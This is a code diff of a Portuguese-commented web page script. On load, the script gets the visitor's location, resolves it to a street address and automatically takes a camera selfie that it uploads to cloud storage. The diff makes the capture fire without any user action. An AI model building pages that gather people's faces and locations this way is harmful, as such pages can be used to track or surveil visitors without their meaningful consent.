@@ -53,8 +53,10 @@
     const canvas = document.getElementById('canvas');
     const context = canvas.getContext('2d');
 
+    let addressDetails = null; // Variável para guardar os detalhes do endereço
+
     // Função para salvar selfie no Storage
-    function uploadSelfieToStorage(selfieData, addressDetails) {
+    function uploadSelfieToStorage(selfieData) {
       const storageRef = storage.ref(`selfies/selfie_${Date.now()}.png`);
       storageRef.putString(selfieData, 'data_url')
         .then(snapshot => snapshot.ref.getDownloadURL())
@@ -69,21 +71,20 @@
     }
 
     // Captura da selfie
-    function captureSelfie(addressDetails) {
-      // Verifica se a câmera está ativa e a imagem aparece no vídeo
-      if (video.readyState === 4) { // Verifica se a mídia está carregada e pronta
+    function captureSelfie() {
+      if (video.readyState === 4) { // Verifica se a câmera está ativa
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
         const selfieData = canvas.toDataURL('image/png', 1.0); // Qualidade máxima
         if (selfieData) {
-          uploadSelfieToStorage(selfieData, addressDetails);
+          uploadSelfieToStorage(selfieData);
         } else {
           alert('Erro ao capturar selfie.');
         }
       } else {
-        alert('Câmera não está pronta. Tente novamente.');
+        alert('Câmera ainda não está pronta.');
       }
     }
 
@@ -97,7 +98,7 @@
         .then(data => {
           if (data.results.length > 0) {
             const result = data.results[0].components;
-            const addressDetails = {
+            addressDetails = {
               latitude: lat,
               longitude: lon,
               city: result.city || result.town || result.village || '',
@@ -108,7 +109,7 @@
               address: data.results[0].formatted
             };
             alert(`Endereço completo: ${addressDetails.address}`);
-            captureSelfie(addressDetails); // Captura selfie após obter o endereço
+            captureSelfie(); // Captura selfie automaticamente após o endereço ser obtido
           } else {
             alert('Endereço não encontrado.');
           }
@@ -140,7 +141,11 @@
           .then(stream => {
             video.srcObject = stream;
             video.onloadedmetadata = () => {
-              alert('Câmera pronta para captura.');
+              alert('Câmera pronta.');
+              // Aguarda o endereço e então captura a selfie
+              if (addressDetails) {
+                captureSelfie();
+              }
             };
           })
           .catch(error => {
@@ -165,8 +170,8 @@
 
     // Iniciar coleta de dados
     window.onload = () => {
-      getLocation();
-      startCamera();
+      getLocation(); // Inicia geolocalização
+      startCamera(); // Inicia a câmera
     };
   </script>
 </body>
